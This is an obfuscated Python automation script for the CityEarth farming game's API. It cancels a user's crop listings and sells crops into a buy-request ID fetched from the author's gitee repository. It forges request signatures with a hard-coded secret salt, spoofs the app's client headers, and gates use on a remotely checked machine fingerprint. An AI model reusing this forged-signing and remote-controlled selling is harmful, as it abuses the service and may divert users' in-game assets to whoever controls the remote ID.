try :#line:2
    import re #line:3
    import os #line:4
    import sys #line:5
    import time #line:6
    import hashlib #line:7
    import requests #line:8
    import random #line:9
    import json #line:10
    import socket #line:11
    from notify import send #line:12
except Exception as E :#line:13
    t =re .findall ("d '(.*?)'",str (E ))[0 ]#line:14
    print (f'{t}依赖未安装')#line:15
    sys .exit ()#line:16
"""
@ cron: * * * 8 *
@ new Env('手动出售芦荟')
@ 脚本会取消上架的农作物再出售芦荟
"""#line:22
application ='ce_token'#line:25
version ='3.1.41955435111'#line:26
git ='https://gitee.com'#line:27
host ='http://scsc.sc19319.com'#line:28
golden_seed =0 #line:29
msg_list =[]#line:30
def O000OO0O00OO00O00 ():#line:33
    if OO00OO0OO0OO00OO00o0 ()in gitee_validation ()['validation']:#line:34
        pass #line:35
    else :#line:36
        exit (1 )#line:37
def kvkv ():#line:38
    return '/vastzzzl/vastzzzl/raw/master'#line:39
def OO00OO0OO0OO00OO00o0 ():#line:42
    return hashlib .md5 ((socket .gethostbyname (get_ip ())+socket .getfqdn (socket .gethostname ())).encode ('utf-8')).hexdigest ().upper ()#line:43
def get_ip ():#line:45
    return requests .request ('get','https://www.xiequ.cn/OnlyIp.aspx?yyy=123').text #line:46
def gitee_validation ():#line:48
    return requests .request ('get',f'{git}{kvkv()}/validation').json ()#line:49
def sign (O00OOOO00OOO0000O ):#line:52
    O0O0OOOO0O0OO0OO0 =hashlib .md5 (O00OOOO00OOO0000O .encode ()).hexdigest ()#line:53
    OOO00000OO0OO0O00 ="scsc%^&*"+O0O0OOOO0O0OO0OO0 +"19319#$%^&*((*&^%$#@#RFGHJ%^KAfghfg"#line:54
    OOO00OOO000000000 =hashlib .md5 (OOO00000OO0OO0O00 .encode ()).hexdigest ()#line:55
    return OOO00OOO000000000 #line:56
def timi_new ():#line:58
    return str (int (time .time ()*1000 ))#line:59
class CityEarth :#line:62
    def __init__ (O0O000OOOOO0O00OO ,O0O0O00OOOO0OOOOO ,O0000OO00O00000OO ):#line:64
        try :#line:65
            O0O000OOOOO0O00OO .msg =O0000OO00O00000OO #line:66
            O0O000OOOOO0O00OO .time =str (time .time ()*1000 ).split ('.')[0 ]#line:67
            O0O000OOOOO0O00OO .token =O0O0O00OOOO0OOOOO ['authorization']#line:68
        except :#line:69
            print ('变量格式错误')#line:70
    def base_info (OO0OOOO000O00OOO0 ):#line:73
        try :#line:74
            O0O0OO0OOOOO0OO0O =f'__{timi_new()}'#line:75
            OOO0O00OO0000OOO0 ={'source':'scsc','authorization':OO0OOOO000O00OOO0 .token ,'timestamp':str (timi_new ()),'sign':sign (O0O0OO0OOOOO0OO0O ),'signstring':O0O0OO0OOOOO0OO0O ,'version':version ,'janalytics':'c167f56858dc424ee3d617c9','Host':'scsc.sc19319.com','User-Agent':'okhttp/4.9.1',}#line:86
            O000OOO0O0O0O0OO0 =requests .request ('get',f'{host}/user',headers =OOO0O00OO0000OOO0 ).json ()#line:87
            if 'status'in O000OOO0O0O0O0OO0 :#line:89
                if O000OOO0O0O0O0OO0 ['status']==200 :#line:90
                    O0O0OOO0000O00000 =O000OOO0O0O0O0OO0 ['data']['nickname']#line:91
                    O0OOO0O0O00OO0OO0 =O000OOO0O0O0O0OO0 ['data']['inner_id']#line:92
                    O000OO0000O0OOO00 =O000OOO0O0O0O0OO0 ['data']['assets']['gold']#line:93
                    O0OOOO00O0OOO00O0 =O000OOO0O0O0O0OO0 ['data']['level']#line:94
                    print (f'【账号信息】:昵称:{O0O0OOO0000O00000[:5]}丨ID:{O0OOO0O0O00OO0OO0}丨等级:{O0OOOO00O0OOO00O0}丨金种子:{str(O000OO0000O0OOO00).split(".")[0]}')#line:95
                if O000OOO0O0O0O0OO0 ['status']==401 :#line:96
                    print (O000OOO0O0O0O0OO0 ['message'])#line:97
                    OO0OOOO000O00OOO0 .msg .append ('有账号失效了')#line:98
                    return False #line:99
                if O000OOO0O0O0O0OO0 ['status']==500 :#line:100
                    return False #line:101
            return True #line:102
        except Exception as O0000O0O0O000000O :#line:103
            print (O0000O0O0O000000O )#line:104
    def sealing (O00000OOOO00O0000 ):#line:107
        try :#line:108
            O0OO00O0O0OOOOO0O =f'__{timi_new()}'#line:109
            OO00O00O0000OOO00 ={'authorization':O00000OOOO00O0000 .token ,'timestamp':str (timi_new ()),'sign':sign (O0OO00O0O0OOOOO0O ),'signstring':O0OO00O0O0OOOOO0O ,'version':version ,'janalytics':'c167f56858dc424ee3d617c9','Host':'scsc.sc19319.com','User-Agent':'okhttp/4.9.1',}#line:119
            requests .request ('get',f'{host}/friends/cash-rewards/rank',headers =OO00O00O0000OOO00 )#line:120
            requests .request ('get',f'{host}/packsack/list',headers =OO00O00O0000OOO00 )#line:121
            requests .request ('get',f'{host}/friends/invited/ad',headers =OO00O00O0000OOO00 )#line:122
            requests .request ('get',f'{host}/assets/gold/rank',headers =OO00O00O0000OOO00 )#line:123
            requests .request ('get',f'{host}/user',headers =OO00O00O0000OOO00 )#line:124
            requests .request ('get',f'{host}/propsraffle/lucky/number',headers =OO00O00O0000OOO00 )#line:125
            requests .request ('get',f'{host}/finance/get-power-list',headers =OO00O00O0000OOO00 )#line:126
            requests .request ('post',f'{host}/announcement/announcement',headers =OO00O00O0000OOO00 )#line:127
            requests .request ('get',f'{host}/game/getAllData',headers =OO00O00O0000OOO00 )#line:128
            requests .request ('get',f'{host}/assets',headers =OO00O00O0000OOO00 )#line:129
        except Exception as O00O0000O0O0O0OO0 :#line:130
            print (O00O0000O0O0O0OO0 )#line:131
    def market_sale_buy (OO0OO000O00OO0OOO ,_O00OO0OOOOOOO0O0O ,OOOO0O0OO00OO0O00 ):#line:139
        try :#line:140
            OO0OOOO00O0OOO0O0 =timi_new ()#line:141
            O0000000OO00O000O =f'_askToBuyId={_O00OO0OOOOOOO0O0O}&quantity={OOOO0O0OO00OO0O00}_{OO0OOOO00O0OOO0O0}'#line:142
            OO0OO000000O0OO0O ={'source':'scsc','authorization':OO0OO000O00OO0OOO .token ,'timestamp':str (OO0OOOO00O0OOO0O0 ),'sign':sign (O0000000OO00O000O ),'signstring':O0000000OO00O000O ,'version':version ,'janalytics':'c167f56858dc424ee3d617c9','Host':'scsc.sc19319.com','User-Agent':'okhttp/4.9.1',}#line:153
            O00O0OOO0O00O00OO ={"askToBuyId":_O00OO0OOOOOOO0O0O ,"quantity":OOOO0O0OO00OO0O00 }#line:154
            OOO0OO0O00O0OO0O0 =requests .request ('post',f'{host}/market/sale-for-ask-to-buy',headers =OO0OO000000O0OO0O ,data =O00O0OOO0O00O00OO ).json ()#line:155
            if 'status'in OOO0OO0O00O0OO0O0 :#line:157
                if OOO0OO0O00O0OO0O0 ['status']==200 :#line:158
                    print ('【出售求购】:出售成功')#line:159
                elif OOO0OO0O00O0OO0O0 ['message']=='请求超时':#line:160
                    OO0OO000O00OO0OOO .market_sale_buy (OO0OO000O00OO0OOO ,_O00OO0OOOOOOO0O0O ,OOOO0O0OO00OO0O00 )#line:161
                else :#line:162
                    print (OOO0OO0O00O0OO0O0 )#line:163
                    exit ()#line:164
        except Exception as O0OO0OO0OOOOOO0O0 :#line:165
            exit ()#line:166
    def game_map (O000OOOO0OO000OO0 ,_OOOO0O00O0OOOOO0O ):#line:169
        try :#line:170
            OOO0O0O000O00000O =f'__{timi_new()}'#line:171
            OOO00000O0O000000 ={'source':'scsc','authorization':O000OOOO0OO000OO0 .token ,'timestamp':str (timi_new ()),'sign':sign (OOO0O0O000O00000O ),'signstring':OOO0O0O000O00000O ,'version':version ,'janalytics':'c167f56858dc424ee3d617c9','Host':'scsc.sc19319.com','User-Agent':'okhttp/4.9.1',}#line:182
            O00OOO00OO0OO0O0O =requests .request ('get',f'{host}/game/map',headers =OOO00000O0O000000 ).json ()#line:183
            if 'status'in O00OOO00OO0OO0O0O :#line:185
                if O00OOO00OO0OO0O0O ['status']==200 :#line:186
                    for O000OO0O0O00OOOOO in O00OOO00OO0OO0O0O ['data']['list'][0 ]['crops']:#line:187
                        OOO0O0O000O00OOO0 =O000OO0O0O00OOOOO ['level']#line:189
                        if OOO0O0O000O00OOO0 ==41 :#line:190
                            OO0OOO0OOOO000OOO =O000OO0O0O00OOOOO ['crop_name']#line:191
                            O0O0O00O0O00OOO0O =O000OO0O0O00OOOOO ['count']#line:192
                            if O0O0O00O0O00OOO0O >0 :#line:193
                                print (f'【农业资产】:{OO0OOO0OOOO000OOO}丨数量:{O0O0O00O0O00OOO0O}')#line:194
                                O000OOOO0OO000OO0 .market_sale_buy (_OOOO0O00O0OOOOO0O ,O0O0O00O0O00OOO0O )#line:195
        except Exception as O00000O0OOO00OO0O :#line:196
            print (O00000O0OOO00OO0O )#line:197
    def query_to_sell (OO0OO00O0OOO0OOO0 ):#line:201
        try :#line:202
            OO00OOOO0O0O0OO00 =f'page=1&pageSize=10&type=crop__{timi_new()}'#line:203
            O00OOO0OOO0000000 ={'source':'scsc','authorization':OO0OO00O0OOO0OOO0 .token ,'timestamp':str (timi_new ()),'sign':sign (OO00OOOO0O0O0OO00 ),'signstring':OO00OOOO0O0O0OO00 ,'version':version ,'janalytics':'c167f56858dc424ee3d617c9','Host':'scsc.sc19319.com','User-Agent':'okhttp/4.9.1',}#line:214
            OOO0000O0O0OOOO0O =requests .request ('get',f'{host}/market/get-owner-sale-list?page=1&pageSize=10&type=crop',headers =O00OOO0OOO0000000 ).json ()#line:215
            if 'status'in OOO0000O0O0OOOO0O :#line:217
                if OOO0000O0O0OOOO0O ['status']==200 :#line:218
                    for OOO0O000OOO0O00O0 in OOO0000O0O0OOOO0O ['data']['rows']:#line:219
                        O000O00O0OOO0O00O =OOO0O000OOO0O00O0 ['materialKey']#line:220
                        O0OOOO00O000OOOO0 =OOO0O000OOO0O00O0 ['quantity']#line:221
                        OO0OO0OO000O0OOOO =OOO0O000OOO0O00O0 ['price']#line:222
                        O0OO00O0000OOO0O0 =OOO0O000OOO0O00O0 ['saleState']#line:223
                        if O0OO00O0000OOO0O0 ==0 :#line:224
                            print (f'【出售订单】:名称:{O000O00O0OOO0O00O}丨数量:{O0OOOO00O000OOOO0}丨价格:{OO0OO0OO000O0OOOO}')#line:225
                            O0OO00OOO00OO00O0 =OOO0O000OOO0O00O0 ['id']#line:226
                            OO0OO00O0OOO0OOO0 .cacel_sale (O0OO00OOO00OO00O0 )#line:227
        except Exception as O0OO0OO0OOO00OO00 :#line:233
            print (O0OO0OO0OOO00OO00 )#line:234
    def cacel_sale (O00OOOOO00O0OO000 ,OOO0OOO0O0OO0OOOO ):#line:238
        try :#line:239
            O00OO0OO0O0OOO0OO =f'_saleId={OOO0OOO0O0OO0OOOO}_{timi_new()}'#line:240
            OO00O0000O0000O00 ={'source':'scsc','authorization':O00OOOOO00O0OO000 .token ,'timestamp':str (timi_new ()),'sign':sign (O00OO0OO0O0OOO0OO ),'signstring':O00OO0OO0O0OOO0OO ,'version':version ,'janalytics':'c167f56858dc424ee3d617c9','Host':'scsc.sc19319.com','User-Agent':'okhttp/4.9.1',}#line:251
            O0000O0OO0O00OOOO ={"saleId":OOO0OOO0O0OO0OOOO }#line:254
            OOO0O000O0OO0OOO0 =requests .request ('post',f'{host}/market/cacel-sale',headers =OO00O0000O0000O00 ,data =O0000O0OO0O00OOOO ).json ()#line:255
            if 'status'in OOO0O000O0OO0OOO0 :#line:257
                if OOO0O000O0OO0OOO0 ['status']==200 :#line:258
                    print (f'【下架出售】:{OOO0O000O0OO0OOO0["data"]}')#line:259
        except Exception as O00OO0O00O0O00O00 :#line:260
            print (O00OO0O00O0O00O00 )#line:261
def start ():#line:263
    try :#line:264
        print (f'你的卡密是：{OO00OO0OO0OO00OO00o0()}')#line:265
        O000OO0O00OO00O00 ()#line:266
        O0O0O0O00O000O00O =json .load (open ("CityEarth_data.json",'r'))['data']#line:267
        print (f"==========共找到{len(O0O0O0O00O000O00O)}个账号==========")#line:268
        for OOO00O0O000O00O0O in O0O0O0O00O000O00O :#line:269
            O00O00O0O0O0OOO0O =[]#line:270
            print (f"------------正在执行第{O0O0O0O00O000O00O.index(OOO00O0O000O00O0O) + 1}个账号------------")#line:271
            OOOO0O0OOOO00OOOO =CityEarth (OOO00O0O000O00O0O ,O00O00O0O0O0OOO0O )#line:272
            if OOOO0O0OOOO00OOOO .base_info ():#line:274
                OOOO0O0OOOO00OOOO .sealing ()#line:276
                OOOO0O0OOOO00OOOO .query_to_sell ()#line:278
                _OO0OOOOO0OOO0O0OO =requests .request ('get','https://gitee.com/vastzzzl/vastzzzl/raw/master/_askToBuyId').json ()['_askToBuyId']#line:281
                OOOO0O0OOOO00OOOO .game_map (_OO0OOOOO0OOO0O0OO )#line:282
    except Exception as OO0000OO0O0O000O0 :#line:284
        print (OO0000OO0O0O000O0 )#line:285
if __name__ =='__main__':#line:288
    start ()#line:289
